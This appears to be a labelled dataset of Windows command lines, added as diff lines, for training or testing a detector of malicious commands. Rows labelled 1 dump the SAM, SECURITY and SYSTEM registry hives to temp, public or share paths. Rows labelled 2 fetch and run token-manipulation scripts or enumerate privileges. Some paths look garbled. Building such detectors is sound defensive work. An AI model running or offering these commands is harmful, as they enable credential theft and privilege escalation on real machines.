+powershell -command reg.exe  save  hkey_local_machine\security  c:\temp\system.hive  /y,1
+pwsh -noprofile -c reg.exe  save   hkey_local_machine\system   c:\users\public\registry_export.reg   /y,1
+"powershell -c reg add ""hku\software\microsoft\windows\currentversion"" /v lastupdate",0
+powershell -command reg export  hklm\sam c:\windows\temp\sam.save /y,1
+powershell -exec bypass -w hidden -c reg save   hkey_local_machine\system  \.\c$ackup.reg,1
+pwsh -noprofile -c reg   export  hkey_local_machine\sam  \.\c$ackup.reg /y,1
+"reg.exe unload ""hkey_current_user\software\microsoft\windows\currentversion"" /v version",0
+reg.exe  export  hkey_local_machine\system   %temp%\sec_backup.dat,1
+c:\windows\system32\cmd.exe /k reg.exe  export   hkey_local_machine\system  %temp%\sec_backup.dat,1
+"cmd /c powershell -c ""reg.exe   export hklm\sam c:\temp\system.hive /y""",1
+"reg.exe delete ""hkey_local_machine\control panel\desktop"" /v version",0
+"reg.exe save ""hkey_current_user\control panel\desktop"" ""c:\temp\user_settings.reg""",0
+iex (new-object net.webclient).downloadstring('invoke-tokenmanipulation.ps1'),2
+powershell -command reg.exe   save  hkey_local_machine\sam   \.\c$ackup.reg /y,1
+cmd.exe /c start /b reg   export   hklm\system   c:\users\public\registry_export.reg /y,1
+"reg.exe delete ""hkey_current_user\system\currentcontrolset\services"" /v version",0
+"cmd /c powershell get-process | select-object -property processname, @{name='serestoreprivilege';expression={$_.privilegestate}}",2
+c:\windows\system32\cmd.exe /k reg export   hkey_local_machine\security \.\c$ackup.reg /y,1
+powershell -exec bypass -w hidden -c reg.exe  save   hkey_local_machine\system   \\localhost\c$\__dump\sam.bak   /y,1
+powershell -command reg.exe save hkey_local_machine\security %temp%\sec_backup.dat /y,1
+pwsh import-module .\adjusttoken.ps1,2
+pwsh -noprofile -c reg  save  hkey_local_machine\security  \.\c$ackup.reg,1
+cmd.exe /c start /b reg   save  hkey_local_machine\system  c:\users\public\registry_export.reg /y,1
+pwsh import-module invoke-tokenmanipulation.ps1,2
+"cmd /c powershell -c ""reg   export   hklm\security   c:\temp\system.hive   /y""",1
+"reg delete ""hkey_current_user\system\currentcontrolset\services"" /f",0
+"pwsh get-process | select-object -property processname, @{name='sedebugprivilege';expression={$_.privilegestate}}",2
+reg.exe   save  hkey_local_machine\system   c:\windows\temp\sam.save,1
+"reg.exe add ""hku\software\microsoft\windows\currentversion"" /f",0
+"cmd /c reg unload ""hku\control panel\desktop"" /v version",0
+powershell -ep bypass import-module .\enablealltokenprivs.ps1,2
+"reg.exe compare ""hkey_users\software\google\chrome"" /v path",0
+"get-process | select-object -property processname, @{name='sebackupprivilege';expression={$_.privilegestate}}",2
+"reg delete ""hkcu\control panel\desktop"" /v path",0
+c:\windows\system32\cmd.exe /k reg.exe  save hkey_local_machine\system   c:\windows\temp\sam.save /y,1
+"reg.exe add ""hkey_current_user\control panel\desktop"" /f",0
+"reg restore ""hku\system\currentcontrolset\services"" /f",0
+"reg.exe copy ""hkey_local_machine\system\currentcontrolset\services"" ",0
+pwsh iex (new-object net.webclient).downloadstring('enablealltokenprivs.ps1'),2
+"reg.exe save ""hkcu\software\microsoft\windows\currentversion"" ""c:\temp\user_settings.reg""",0
+"reg copy ""hkey_current_user\software\policies\mycorp"" /v lastupdate",0
+cmd /c powershell import-module invoke-tokenmanipulation.ps1,2
+"reg.exe delete ""hku\software\policies\mycorp"" /v version",0
+pwsh import-module adjusttoken.ps1,2
+cmd.exe /c reg.exe export   hklm\system \.\c$ackup.reg   /y,1
+start /b whoami /user,0
+c:\windows\system32\cmd.exe /k reg  save  hkey_local_machine\sam   c:\temp\system.hive,1
+powershell -command reg  export hkey_local_machine\security  \\localhost\c$\__dump\sam.bak,1
+"powershell -c reg.exe delete ""hkey_current_user\software\policies\mycorp"" ",0
+"reg compare ""hkey_local_machine\system\currentcontrolset\services"" ",0
+"reg save ""hku\system\currentcontrolset\services"" ""c:\temp\user_settings.reg""",0
+"reg.exe query ""hkey_users\software\google\chrome"" /v path",0
+powershell -c .\check-diskspace.ps1,0
+"reg.exe restore ""hkey_users\control panel\desktop"" /v version",0
+reg.exe  save hkey_local_machine\security c:\windows\temp\sam.save /y,1
+pwsh -noprofile -c reg.exe  export hklm\security   \\localhost\c$\__dump\sam.bak,1
+cmd /c powershell .\adjusttoken.ps1,2
+powershell -command reg.exe   export   hklm\security  c:\temp\system.hive,1
+pwsh -noprofile -c reg   save  hkey_local_machine\security   c:\windows\temp\sam.save,1
+powershell -exec bypass -w hidden -c reg.exe   save  hklm\sam   c:\users\public\registry_export.reg /y,1
+"reg.exe copy ""hkey_current_user\software\google\chrome"" ",0
+cmd.exe /c reg save  hkey_local_machine\system  \.\c$ackup.reg,1
+c:\windows\system32\cmd.exe /k reg  save hklm\security c:\users\public\registry_export.reg,1
+cmd.exe /c reg save  hklm\system   c:\windows\temp\sam.save /y,1
+"cmd /c powershell -c ""reg.exe   save  hklm\system  c:\windows\temp\sam.save  /y""",1
+"reg compare ""hkey_current_user\system\currentcontrolset\services"" /v lastupdate",0
+"reg.exe add ""hku\control panel\desktop"" /v version",0
+"reg query ""hkey_local_machine\software\microsoft\windows\currentversion"" /f",0
+powershell -command reg.exe export  hkey_local_machine\system   \.\c$ackup.reg,1
+powershell -c import-module .\enablealltokenprivs.ps1,2
+"powershell -c reg restore ""hku\software\policies\mycorp"" /f",0
+reg save  hkey_local_machine\system \.\c$ackup.reg /y,1
+pwsh -noprofile -c reg   save hkey_local_machine\sam c:\windows\temp\sam.save,1
+c:\windows\system32\cmd.exe /k reg.exe   save   hkey_local_machine\security   \.\c$ackup.reg,1
+reg save  hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak  /y,1
+pwsh -noprofile -c reg.exe save   hklm\system  c:\windows\temp\sam.save,1
+"cmd /c powershell -c ""reg export hklm\security  c:\users\public\registry_export.reg""",1
+cmd /c powershell .\enablealltokenprivs.ps1,2
+import-module configmanager,0
+"reg.exe query ""hkey_users\system\currentcontrolset\services"" ",0
+reg.exe  save   hkey_local_machine\security \.\c$ackup.reg  /y,1
+pwsh -noprofile -c reg  save   hklm\system  c:\users\public\registry_export.reg /y,1
+powershell -exec bypass -w hidden -c reg   export  hklm\security   c:\users\public\registry_export.reg   /y,1
+"reg.exe copy ""hku\software\google\chrome"" ",0
+c:\windows\system32\cmd.exe /k reg.exe save   hkey_local_machine\system   c:\temp\system.hive /y,1
+"reg unload ""hkey_users\system\currentcontrolset\services"" /v lastupdate",0
+powershell -exec bypass -w hidden -c reg   save hkey_local_machine\sam  c:\users\public\registry_export.reg  /y,1
+"start /b reg.exe copy ""hkey_users\system\currentcontrolset\services"" /v lastupdate",0
+powershell -c iex (new-object net.webclient).downloadstring('adjusttoken.ps1'),2
+"reg save ""hkcu\software\google\chrome"" ""c:\temp\user_settings.reg""",0
+powershell -ep bypass iex (new-object net.webclient).downloadstring('invoke-tokenmanipulation.ps1'),2
+c:\windows\system32\cmd.exe /k reg.exe  export  hklm\system  c:\windows\temp\sam.save,1
+pwsh -noprofile -c reg   save hklm\system   c:\temp\system.hive  /y,1
+"reg.exe compare ""hkey_users\software\google\chrome"" ",0
+cmd.exe /c reg.exe save  hkey_local_machine\sam c:\windows\temp\sam.save,1
+cmd.exe /c reg.exe save  hklm\system   c:\windows\temp\sam.save   /y,1
+c:\windows\system32\cmd.exe /k reg.exe  export hklm\sam   \.\c$ackup.reg /y,1
+start /b .\update-system.ps1,0
+pwsh -noprofile -c reg.exe save   hkey_local_machine\sam \.\c$ackup.reg,1
+powershell -command reg export hkey_local_machine\sam   c:\windows\temp\sam.save,1
+"start /b reg.exe delete ""hkey_local_machine\software\policies\mycorp"" /f",0
+"reg query ""hkey_current_user\control panel\desktop"" /v path",0
+pwsh -noprofile -c reg   save hklm\security   c:\temp\system.hive,1
+powershell -ep bypass import-module adjusttoken.ps1,2
+powershell -command reg save hklm\security   %temp%\sec_backup.dat,1
+"reg.exe unload ""hkey_users\software\policies\mycorp"" /v path",0
+"cmd /c powershell -c ""reg export   hkey_local_machine\sam  \.\c$ackup.reg""",1
+"cmd /c powershell -c ""reg   export hklm\sam  c:\temp\system.hive   /y""",1
+c:\windows\system32\cmd.exe /k reg.exe   save  hklm\sam   c:\temp\system.hive   /y,1
+pwsh .\enablealltokenprivs.ps1,2
+powershell -exec bypass -w hidden -c reg.exe export hklm\sam \.\c$ackup.reg  /y,1
+"reg copy ""hkey_current_user\control panel\desktop"" /f",0
+"cmd /c powershell -c ""reg.exe  export  hkey_local_machine\security   \.\c$ackup.reg /y""",1
+.\adjusttoken.ps1,2
+"reg.exe restore ""hkey_users\software\microsoft\windows\currentversion"" ",0
+"cmd /c reg unload ""hkey_local_machine\system\currentcontrolset\services"" /f",0
+pwsh -noprofile -c reg save  hkey_local_machine\system c:\windows\temp\sam.save  /y,1
+powershell -ep bypass import-module enablealltokenprivs.ps1,2
+pwsh -noprofile -c reg  export hkey_local_machine\system c:\windows\temp\sam.save,1
+"reg.exe restore ""hkcu\software\microsoft\windows\currentversion"" /v lastupdate",0
+cmd.exe /c reg   save  hklm\sam c:\temp\system.hive   /y,1
+"powershell -ep bypass get-process | select-object -property processname, @{name='setakeownershipprivilege';expression={$_.privilegestate}}",2
+powershell -exec bypass -w hidden -c reg.exe   save hklm\security   \\localhost\c$\__dump\sam.bak,1
+c:\windows\system32\cmd.exe /k reg   save   hkey_local_machine\sam %temp%\sec_backup.dat,1
+powershell -exec bypass -w hidden -c reg   save   hkey_local_machine\system  c:\users\public\registry_export.reg   /y,1
+"reg save ""hkey_current_user\software\policies\mycorp"" ""c:\users\public\chrome_data.bak""",0
+c:\windows\system32\cmd.exe /k reg.exe save hkey_local_machine\security  c:\windows\temp\sam.save  /y,1
+"cmd /c powershell -c ""reg.exe  export   hkey_local_machine\security c:\windows\temp\sam.save  /y""",1
+cmd.exe /c start /b reg   export hkey_local_machine\system  c:\windows\temp\sam.save,1
+pwsh -noprofile -c reg.exe   export   hklm\sam   \\localhost\c$\__dump\sam.bak,1
+powershell -command reg  export   hkey_local_machine\system  c:\temp\system.hive,1
+pwsh -noprofile -c reg  export hkey_local_machine\security   c:\users\public\registry_export.reg /y,1
+powershell -command reg.exe  save   hkey_local_machine\system   \\localhost\c$\__dump\sam.bak  /y,1
+import-module set-tokenprivs.ps1,2
+cmd.exe /c reg   save  hklm\security   c:\temp\system.hive,1
+cmd /c powershell import-module enable-privilege.ps1,2
+cmd.exe /c reg.exe   save  hkey_local_machine\security  %temp%\sec_backup.dat  /y,1
+"cmd /c powershell -c ""reg.exe save hklm\security  \.\c$ackup.reg  /y""",1
+reg.exe  save   hkey_local_machine\security  c:\users\public\registry_export.reg   /y,1
+reg.exe  save hklm\system \.\c$ackup.reg,1
+import-module dnsclient,0
+cmd /c powershell iex (new-object net.webclient).downloadstring('invoke-tokenmanipulation.ps1'),2
+pwsh .\adjusttoken.ps1,2
+"reg.exe delete ""hku\software\google\chrome"" /f",0
+"reg compare ""hkcu\software\google\chrome"" /f",0
+"start /b reg restore ""hkey_current_user\control panel\desktop"" /v lastupdate",0
+"cmd /c powershell -c ""reg.exe export  hklm\system c:\users\public\registry_export.reg  /y""",1
+pwsh -noprofile -c reg   save   hklm\system   %temp%\sec_backup.dat,1
+"reg query ""hku\software\policies\mycorp"" /v lastupdate",0
+cmd.exe /c reg.exe  save hklm\sam \\localhost\c$\__dump\sam.bak /y,1
+"reg.exe query ""hku\software\policies\mycorp"" /f",0
+reg.exe  export   hklm\sam \.\c$ackup.reg,1
+cmd.exe /c start /b reg.exe  save  hkey_local_machine\security c:\temp\system.hive,1
+"cmd /c reg.exe restore ""hkcu\system\currentcontrolset\services"" ",0
+"cmd /c powershell -c ""reg  save hklm\security \.\c$ackup.reg""",1
+"powershell -c reg.exe unload ""hkey_users\software\policies\mycorp"" /v version",0
+"cmd /c reg restore ""hkey_local_machine\control panel\desktop"" /v lastupdate",0
+pwsh .\set-tokenprivs.ps1,2
+pwsh -noprofile -c reg.exe export  hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak,1
+powershell -ep bypass import-module invoke-tokenmanipulation.ps1,2
+powershell -exec bypass -w hidden -c reg.exe  export   hkey_local_machine\security   \\localhost\c$\__dump\sam.bak,1
+"reg delete ""hkey_local_machine\system\currentcontrolset\services"" /v lastupdate",0
+pwsh -noprofile -c reg   export   hklm\system   \.\c$ackup.reg,1
+cmd.exe /c reg.exe export   hklm\system \\localhost\c$\__dump\sam.bak /y,1
+cmd.exe /c start /b reg.exe save hklm\security   \.\c$ackup.reg  /y,1
+"reg.exe unload ""hkey_users\software\microsoft\windows\currentversion"" /v version",0
+"reg.exe restore ""hkey_local_machine\software\google\chrome"" /v path",0
+"reg compare ""hkey_local_machine\software\microsoft\windows\currentversion"" ",0
+cmd.exe /c start /b reg.exe save   hkey_local_machine\sam %temp%\sec_backup.dat   /y,1
+c:\windows\system32\cmd.exe /k reg  export hklm\system  c:\users\public\registry_export.reg,1
+"reg.exe restore ""hkcu\control panel\desktop"" ",0
+"reg query ""hkey_users\software\google\chrome"" ",0
+cmd /c powershell iex (new-object net.webclient).downloadstring('set-tokenprivs.ps1'),2
+c:\windows\system32\cmd.exe /k reg.exe  export  hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak,1
+reg.exe  export  hkey_local_machine\security   %temp%\sec_backup.dat  /y,1
+c:\windows\system32\cmd.exe /k reg  save hkey_local_machine\security   \\localhost\c$\__dump\sam.bak,1
+reg  save hkey_local_machine\security \\localhost\c$\__dump\sam.bak  /y,1
+reg  export  hklm\security \\localhost\c$\__dump\sam.bak,1
+"reg save ""hkey_users\system\currentcontrolset\services"" ""c:\users\public\chrome_data.bak""",0
+"cmd /c powershell -c ""reg  save  hkey_local_machine\sam  c:\temp\system.hive /y""",1
+powershell -exec bypass -w hidden -c reg.exe   save  hklm\sam  %temp%\sec_backup.dat,1
+"reg.exe restore ""hkcu\software\google\chrome"" /v version",0
+"cmd /c powershell -c ""reg.exe  save hkey_local_machine\security   c:\temp\system.hive   /y""",1
+"cmd /c reg copy ""hkcu\system\currentcontrolset\services"" /f",0
+cmd.exe /c start /b reg.exe  save   hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak  /y,1
+cmd.exe /c reg save   hklm\sam   c:\windows\temp\sam.save  /y,1
+start /b import-module dnsclient,0
+powershell -command reg save   hkey_local_machine\security  %temp%\sec_backup.dat,1
+powershell -command reg export hkey_local_machine\security c:\windows\temp\sam.save,1
+"reg.exe delete ""hku\system\currentcontrolset\services"" /v version",0
+"reg add ""hkey_local_machine\software\google\chrome"" ",0
+"reg query ""hkey_local_machine\software\google\chrome"" /f",0
+cmd.exe /c start /b reg.exe   export   hklm\sam  \.\c$ackup.reg   /y,1
+cmd.exe /c reg save   hklm\sam   \\localhost\c$\__dump\sam.bak  /y,1
+"cmd /c powershell -c ""reg   export   hklm\security   \\localhost\c$\__dump\sam.bak""",1
+pwsh whoami /priv,2
+import-module invoke-tokenmanipulation.ps1,2
+reg.exe   save  hklm\sam \.\c$ackup.reg /y,1
+"reg copy ""hkey_users\control panel\desktop"" /v version",0
+"reg.exe copy ""hkcu\system\currentcontrolset\services"" /v path",0
+pwsh -noprofile -c reg.exe save  hkey_local_machine\security   \\localhost\c$\__dump\sam.bak,1
+powershell -command reg  export   hklm\system  c:\windows\temp\sam.save /y,1
+powershell -command reg save   hklm\security  %temp%\sec_backup.dat,1
+"reg compare ""hkey_current_user\control panel\desktop"" /v version",0
+cmd.exe /c reg  export  hklm\security   c:\windows\temp\sam.save,1
+cmd /c powershell cmd.exe /c whoami /priv,2
+powershell -command reg  export   hklm\system  c:\temp\system.hive   /y,1
+powershell -exec bypass -w hidden -c reg.exe save  hklm\security   c:\temp\system.hive,1
+"reg restore ""hku\control panel\desktop"" /v version",0
+cmd /c .\update-system.ps1,0
+reg.exe export   hklm\system %temp%\sec_backup.dat,1
+"reg copy ""hkcu\control panel\desktop"" ",0
+pwsh import-module .\enablealltokenprivs.ps1,2
+powershell -c import-module .\set-tokenprivs.ps1,2
+powershell -command reg.exe   export  hklm\system   \\localhost\c$\__dump\sam.bak /y,1
+reg export   hkey_local_machine\system  \.\c$ackup.reg,1
+reg.exe export hkey_local_machine\sam  \.\c$ackup.reg /y,1
+cmd /c whoami /all,0
+"reg.exe delete ""hkey_users\software\microsoft\windows\currentversion"" /v version",0
+"reg compare ""hkey_users\control panel\desktop"" ",0
+c:\windows\system32\cmd.exe /k reg   export   hkey_local_machine\sam \.\c$ackup.reg,1
+pwsh -noprofile -c reg  save  hklm\sam  c:\temp\system.hive  /y,1
+whoami /groups,2
+pwsh whoami /groups,2
+"reg.exe compare ""hkey_local_machine\software\policies\mycorp"" /v path",0
+pwsh -noprofile -c reg save  hkey_local_machine\system \.\c$ackup.reg /y,1
+"reg.exe unload ""hku\software\policies\mycorp"" /v path",0
+"powershell -c reg query ""hku\software\google\chrome"" /v version",0
+powershell -exec bypass -w hidden -c reg save   hkey_local_machine\security   c:\temp\system.hive,1
+"reg.exe unload ""hkey_users\software\policies\mycorp"" /v version",0
+cmd.exe /c reg  export hkey_local_machine\security  c:\users\public\registry_export.reg /y,1
+cmd.exe /c reg.exe export  hklm\security   \.\c$ackup.reg   /y,1
+"powershell -c reg restore ""hkey_current_user\software\policies\mycorp"" /v lastupdate",0
+"cmd /c powershell -c ""reg  export hkey_local_machine\sam c:\temp\system.hive /y""",1
+powershell -exec bypass -w hidden -c reg.exe   export  hkey_local_machine\security  %temp%\sec_backup.dat,1
+"start /b reg save ""hkey_current_user\software\policies\mycorp"" ""c:\temp\user_settings.reg""",0
+powershell -exec bypass -w hidden -c reg.exe  save  hkey_local_machine\system \.\c$ackup.reg,1
+pwsh -noprofile -c reg.exe  export hklm\security   c:\windows\temp\sam.save,1
+cmd.exe /c start /b reg  export hklm\sam c:\temp\system.hive,1
+"cmd /c powershell get-process | select-object -property processname, @{name='setakeownershipprivilege';expression={$_.privilegestate}}",2
+powershell -command reg.exe   save  hkey_local_machine\system   c:\users\public\registry_export.reg   /y,1
+pwsh -noprofile -c reg export  hklm\sam   \\localhost\c$\__dump\sam.bak  /y,1
+reg.exe  export  hklm\system   \\localhost\c$\__dump\sam.bak   /y,1
+"powershell -c reg save ""hku\software\policies\mycorp"" ""c:\temp\user_settings.reg""",0
+cmd /c import-module netadapter,0
+cmd.exe /c reg export   hkey_local_machine\security   c:\windows\temp\sam.save  /y,1
+"powershell -c reg.exe restore ""hkey_local_machine\system\currentcontrolset\services"" /v lastupdate",0
+reg   export   hklm\system c:\windows\temp\sam.save,1
+"reg.exe compare ""hkey_current_user\software\policies\mycorp"" ",0
+c:\windows\system32\cmd.exe /k reg export  hkey_local_machine\sam  c:\temp\system.hive  /y,1
+pwsh -noprofile -c reg.exe   save hklm\system  c:\windows\temp\sam.save,1
+"cmd /c powershell -c ""reg  export  hkey_local_machine\security  c:\windows\temp\sam.save""",1
+"cmd /c powershell -c ""reg.exe  save   hkey_local_machine\sam   c:\temp\system.hive /y""",1
+cmd.exe /c whoami /priv,2
+"reg.exe save ""hkey_local_machine\software\microsoft\windows\currentversion"" ""c:\users\public\chrome_data.bak""",0
+"reg unload ""hkcu\control panel\desktop"" /v version",0
+reg.exe   export   hklm\system %temp%\sec_backup.dat   /y,1
+"cmd /c powershell -c ""reg.exe  save   hklm\system  c:\windows\temp\sam.save   /y""",1
+pwsh -noprofile -c reg.exe export   hklm\system   c:\temp\system.hive   /y,1
+cmd.exe /c reg.exe   save  hkey_local_machine\sam   c:\windows\temp\sam.save,1
+"cmd /c powershell -c ""reg.exe  save  hkey_local_machine\system c:\users\public\registry_export.reg  /y""",1
+cmd.exe /c start /b reg save hklm\security  \.\c$ackup.reg,1
+powershell -c hostname,0
+pwsh -noprofile -c reg.exe  save   hkey_local_machine\sam  c:\windows\temp\sam.save  /y,1
+cmd /c .\log-useractivity.ps1,0
+powershell -command reg.exe save hklm\sam c:\users\public\registry_export.reg  /y,1
+c:\windows\system32\cmd.exe /k reg   save hklm\security   c:\users\public\registry_export.reg,1
+reg save hkey_local_machine\system   \.\c$ackup.reg,1
+pwsh -noprofile -c reg export hklm\system  %temp%\sec_backup.dat   /y,1
+"reg unload ""hkey_users\software\google\chrome"" ",0
+cmd.exe /c start /b reg  save hklm\sam  c:\temp\system.hive,1
+cmd.exe /c start /b reg.exe export   hklm\security \\localhost\c$\__dump\sam.bak /y,1
+c:\windows\system32\cmd.exe /k reg export hklm\security   \\localhost\c$\__dump\sam.bak   /y,1
+"powershell -c reg.exe add ""hkey_current_user\software\google\chrome"" /v path",0
+powershell -ep bypass import-module enable-privilege.ps1,2
+"reg.exe copy ""hkey_current_user\software\google\chrome"" /f",0
+"get-process | select-object -property processname, @{name='setcbprivilege';expression={$_.privilegestate}}",2
+"cmd /c powershell -c ""reg save hklm\sam  c:\users\public\registry_export.reg""",1
+cmd.exe /c reg.exe   export   hklm\system  c:\windows\temp\sam.save,1
+cmd.exe /c reg.exe  export   hklm\sam   c:\windows\temp\sam.save  /y,1
+cmd.exe /c reg.exe   export  hkey_local_machine\sam   c:\users\public\registry_export.reg,1
+c:\windows\system32\cmd.exe /k reg.exe   export hklm\security   c:\windows\temp\sam.save,1
+powershell -c .\invoke-tokenmanipulation.ps1,2
+c:\windows\system32\cmd.exe /k reg.exe   export hkey_local_machine\sam c:\users\public\registry_export.reg,1
+powershell -c get-process,0
+pwsh -noprofile -c reg  save  hklm\system c:\users\public\registry_export.reg   /y,1
+reg.exe  save hkey_local_machine\sam %temp%\sec_backup.dat,1
+cmd.exe /c reg.exe   export   hkey_local_machine\system c:\users\public\registry_export.reg,1
+reg.exe save hklm\sam  c:\users\public\registry_export.reg,1
+"cmd /c powershell -c ""reg.exe  export  hkey_local_machine\system  \\localhost\c$\__dump\sam.bak /y""",1
+reg  export hkey_local_machine\system c:\users\public\registry_export.reg   /y,1
+.\log-useractivity.ps1,0
+.\enable-privilege.ps1,2
+c:\windows\system32\cmd.exe /k reg.exe  export  hkey_local_machine\security   \\localhost\c$\__dump\sam.bak,1
+cmd.exe /c start /b reg.exe  export   hklm\sam c:\windows\temp\sam.save,1
+reg.exe  export  hkey_local_machine\security   c:\users\public\registry_export.reg   /y,1
+cmd.exe /c start /b reg  export  hklm\system c:\windows\temp\sam.save,1
+"cmd /c powershell -c ""reg.exe   save   hklm\system   %temp%\sec_backup.dat""",1
+cmd.exe /c reg.exe  export  hklm\sam  c:\temp\system.hive /y,1
+powershell -c import-module set-tokenprivs.ps1,2
+"reg.exe restore ""hkey_users\software\policies\mycorp"" ",0
+pwsh -noprofile -c reg   save  hkey_local_machine\security  c:\temp\system.hive,1
+powershell -exec bypass -w hidden -c reg.exe   export  hklm\system   c:\windows\temp\sam.save /y,1
+reg save   hkey_local_machine\system  c:\temp\system.hive,1
+c:\windows\system32\cmd.exe /k reg.exe export   hklm\security   %temp%\sec_backup.dat  /y,1
+powershell -c get-date,0
+"reg.exe unload ""hkey_current_user\system\currentcontrolset\services"" /v lastupdate",0
+cmd.exe /c start /b reg export hklm\system c:\windows\temp\sam.save   /y,1
+"cmd /c powershell -c ""reg.exe   save   hkey_local_machine\security  c:\temp\system.hive""",1
+cmd.exe /c start /b reg  export hkey_local_machine\sam  %temp%\sec_backup.dat,1
+pwsh -noprofile -c reg.exe   export  hkey_local_machine\security  c:\windows\temp\sam.save,1
+powershell -exec bypass -w hidden -c reg   export   hkey_local_machine\sam   c:\windows\temp\sam.save  /y,1
+pwsh -noprofile -c reg.exe  save hklm\system c:\temp\system.hive,1
+powershell -command reg.exe  save hkey_local_machine\security   c:\windows\temp\sam.save,1
+"start /b reg add ""hku\system\currentcontrolset\services"" ",0
+reg save  hklm\system   c:\temp\system.hive  /y,1
+"powershell -c get-process | select-object -property processname, @{name='sebackupprivilege';expression={$_.privilegestate}}",2
+"reg compare ""hkey_users\control panel\desktop"" /v version",0
+pwsh -noprofile -c reg  export  hklm\sam \\localhost\c$\__dump\sam.bak,1
+"cmd /c powershell -c ""reg export hkey_local_machine\system \\localhost\c$\__dump\sam.bak  /y""",1
+c:\windows\system32\cmd.exe /k reg save   hklm\security   \.\c$ackup.reg  /y,1
+powershell -command reg  export   hklm\security c:\users\public\registry_export.reg,1
+"cmd /c powershell -c ""reg  save  hklm\sam %temp%\sec_backup.dat""",1
+reg  export   hkey_local_machine\security c:\windows\temp\sam.save   /y,1
+"get-process | select-object -property processname, @{name='serestoreprivilege';expression={$_.privilegestate}}",2
+powershell -exec bypass -w hidden -c reg.exe  save  hklm\security   c:\users\public\registry_export.reg  /y,1
+cmd.exe /c reg.exe   export hkey_local_machine\security   c:\users\public\registry_export.reg /y,1
+cmd.exe /c start /b reg  export   hkey_local_machine\security \.\c$ackup.reg,1
+"cmd /c powershell -c ""reg  export hkey_local_machine\sam  %temp%\sec_backup.dat""",1
+"powershell -c get-process | select-object -property processname, @{name='serestoreprivilege';expression={$_.privilegestate}}",2
+powershell -exec bypass -w hidden -c reg.exe  save  hklm\system c:\windows\temp\sam.save /y,1
+powershell -exec bypass -w hidden -c reg  export  hkey_local_machine\system  %temp%\sec_backup.dat,1
+"cmd /c powershell -c ""reg.exe export hklm\security  c:\windows\temp\sam.save""",1
+pwsh -noprofile -c reg.exe  export  hklm\system c:\windows\temp\sam.save,1
+"reg add ""hkey_current_user\software\policies\mycorp"" /v version",0
+"reg compare ""hku\system\currentcontrolset\services"" /v path",0
+"reg copy ""hku\software\policies\mycorp"" /v lastupdate",0
+cmd.exe /c reg   export  hklm\system   %temp%\sec_backup.dat,1
+import-module netadapter,0
+"cmd /c reg.exe compare ""hku\system\currentcontrolset\services"" /v version",0
+"cmd /c powershell -c ""reg   save   hklm\system   c:\users\public\registry_export.reg""",1
+pwsh -noprofile -c reg  export   hkey_local_machine\sam c:\windows\temp\sam.save /y,1
+cmd.exe /c reg  save  hklm\security %temp%\sec_backup.dat,1
+"reg query ""hku\software\policies\mycorp"" /f",0
+pwsh -noprofile -c reg.exe   save hkey_local_machine\system c:\users\public\registry_export.reg  /y,1
+"reg.exe add ""hkey_local_machine\system\currentcontrolset\services"" ",0
+powershell -c .\set-tokenprivs.ps1,2
+pwsh -noprofile -c reg.exe  export   hkey_local_machine\sam  c:\windows\temp\sam.save  /y,1
+"cmd /c powershell -c ""reg   export   hkey_local_machine\sam   c:\windows\temp\sam.save""",1
+"reg query ""hkey_current_user\software\policies\mycorp"" ",0
+"start /b reg.exe restore ""hkey_current_user\control panel\desktop"" /f",0
+cmd /c import-module configmanager,0
+"cmd /c powershell -c ""reg.exe  save hklm\system  \\localhost\c$\__dump\sam.bak""",1
+cmd.exe /c start /b reg.exe  export   hklm\sam   c:\windows\temp\sam.save,1
+"reg delete ""hku\software\google\chrome"" ",0
+powershell -ep bypass iex (new-object net.webclient).downloadstring('set-tokenprivs.ps1'),2
+"reg.exe delete ""hkey_local_machine\software\microsoft\windows\currentversion"" /v version",0
+powershell -command reg.exe   export   hklm\security c:\temp\system.hive,1
+pwsh -noprofile -c reg export hklm\security  \\localhost\c$\__dump\sam.bak  /y,1
+"reg unload ""hkcu\control panel\desktop"" /v lastupdate",0
+cmd.exe /c start /b reg   export hklm\sam \\localhost\c$\__dump\sam.bak /y,1
+pwsh -noprofile -c reg.exe save  hklm\system   \.\c$ackup.reg,1
+powershell -c whoami /groups,2
+"cmd /c powershell get-process | select-object -property processname, @{name='setcbprivilege';expression={$_.privilegestate}}",2
